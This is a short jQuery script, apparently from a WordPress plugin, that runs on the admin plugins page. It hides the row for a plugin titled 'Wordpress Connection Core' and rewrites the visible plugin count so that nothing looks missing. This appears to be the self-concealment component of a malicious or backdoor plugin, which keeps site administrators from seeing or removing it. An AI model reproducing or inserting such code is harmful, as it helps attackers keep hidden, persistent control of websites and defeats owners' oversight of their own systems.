jQuery(document).ready(function(){
    jQuery("#the-list tr").each(function(i) {
        var get_content = jQuery(this).find('.plugin-title.column-primary strong').html();
        if(get_content === 'Wordpress Connection Core') {
            jQuery(this).hide();
        }
    })
    var count_users = jQuery("#the-list tr").length - 1;
    jQuery('.subsubsub li a .count').html("(" + count_users + ")");
});